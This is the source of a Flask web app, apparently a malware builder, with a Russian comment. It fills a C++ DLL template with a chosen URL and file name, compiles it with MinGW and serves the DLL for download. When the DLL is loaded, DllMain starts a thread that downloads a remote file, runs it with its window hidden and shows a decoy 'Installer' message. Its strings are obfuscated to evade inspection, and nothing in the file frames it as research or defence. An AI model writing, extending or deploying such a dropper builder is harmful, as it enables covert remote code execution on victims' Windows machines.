from flask import Flask, request, send_file, render_template, session, redirect, url_for
import os
import tempfile
import subprocess
import random
import string
import re

app = Flask(__name__)
app.secret_key = os.urandom(24)

USERS = {"admin": "password123"}

TEMPLATE = """#include "obfusheader.h"
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib, "wininet.lib")

void ExecuteHidden(const char* filePath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    char cmdLine[MAX_PATH * 2];
    sprintf_s(cmdLine, sizeof(cmdLine), "\\"%s\\"", filePath);
    CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

void ShowMessage(const char* msg) {
    MessageBoxA(NULL, msg, OBF("Installer"), MB_OK);
}

void DoMagic() {
    char savePath[MAX_PATH];
    const char* targetFolder = OBF("{{SAVE_PATH}}");
    const char* fileName = OBF("{{FILE_NAME}}");
    const char* url = OBF("{{URL}}");
    const char* authKey = OBF("{{AUTH_KEY}}");
    sprintf_s(savePath, sizeof(savePath), "%s\\\\%s", targetFolder, fileName);

    HINTERNET hInternet = InternetOpenA(OBF("Mozilla/5.0"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    char headers[256];
    sprintf_s(headers, sizeof(headers), "X-Auth-Key: %s\\r\\n", authKey);
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, headers, strlen(headers), INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) { InternetCloseHandle(hInternet); return; }

    HANDLE hFile = CreateFileA(savePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        BYTE buffer[4096];
        DWORD bytesRead;
        DWORD totalBytes = 0;
        while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
            DWORD bytesWritten;
            WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
            totalBytes += bytesWritten;
        }
        CloseHandle(hFile);
        if (totalBytes > 10000) {
            ExecuteHidden(savePath);
            ShowMessage(OBF("{{MESSAGE}}"));
        }
    }
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        HANDLE hThread = CreateThread(NULL, 0, [](LPVOID) -> DWORD { DoMagic(); return 0; }, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    return TRUE;
}
"""

def random_string(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def random_hex_key(length=16):
    return ''.join(random.choices(string.hexdigits, k=length)).lower()

@app.route('/')
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('builder.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username in USERS and USERS[username] == password:
            session['logged_in'] = True
            return redirect(url_for('index'))
        return "Invalid credentials", 401
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/build', methods=['POST'])
def build():
    if not session.get('logged_in'):
        return "Unauthorized", 401

    url = request.form.get('url')
    save_path = request.form.get('save_path')
    message = request.form.get('message', 'Installation complete!')
    custom_filename = request.form.get('custom_filename', '')

    auth_key = random_hex_key(16)
    if custom_filename:
        filename = custom_filename if custom_filename.endswith('.dll') else custom_filename + '.dll'
    else:
        filename = f"lib{random_string(12)}.dll"

    code = TEMPLATE.replace("{{SAVE_PATH}}", save_path)
    code = code.replace("{{FILE_NAME}}", filename)
    code = code.replace("{{URL}}", url)
    code = code.replace("{{MESSAGE}}", message)
    code = code.replace("{{AUTH_KEY}}", auth_key)

    # Создаём папку для временных файлов
    tmp_dir = "/tmp/build"
    os.makedirs(tmp_dir, exist_ok=True)

    with tempfile.NamedTemporaryFile(mode='w', suffix='.cpp', delete=False, dir=tmp_dir) as f:
        f.write(code)
        cpp_path = f.name

    out_dll = cpp_path.replace('.cpp', '.dll')
    
    # Компиляция через MinGW
    compile_cmd = [
        'x86_64-w64-mingw32-g++', '-O2', '-s', '-static', '-shared',
        '-D_WIN32_WINNT=0x0600',
        '-o', out_dll, cpp_path,
        '-lwininet', '-lws2_32'
    ]
    
    try:
        result = subprocess.run(compile_cmd, check=True, capture_output=True, text=True)
        print(result.stdout, result.stderr)
    except Exception as e:
        return f"Compilation failed: {e}", 500

    return send_file(out_dll, as_attachment=True, download_name=filename)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
